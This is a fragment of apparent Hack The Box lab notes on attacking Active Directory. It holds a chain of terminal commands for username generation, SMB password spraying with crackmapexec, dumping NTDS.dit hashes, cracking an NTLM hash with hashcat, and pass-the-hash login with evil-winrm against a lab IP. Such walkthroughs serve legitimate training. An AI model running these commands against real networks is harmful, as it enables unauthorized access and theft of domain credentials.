...
- [Attacking Active Directory \& NTDS.dit](#attacking-active-directory--ntdsdit)
  ...
  - [**Capturing NTDS.dit**](#capturing-ntdsdit)
    ...
    - [**A Faster Method: Using cme to Capture NTDS.dit**](#a-faster-method-using-cme-to-capture-ntdsdit)
...
```
th1nyunb0y@htb[/htb]$ cat usernames.txt 
bwilliamson
benwilliamson
ben.willamson
willamson.ben
...
```
th1nyunb0y@htb[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
...
```
th1nyunb0y@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
...
```
th1nyunb0y@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
...
```
th1nyunb0y@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
...
```
th1nyunb0y@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
...
```
th1nyunb0y@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
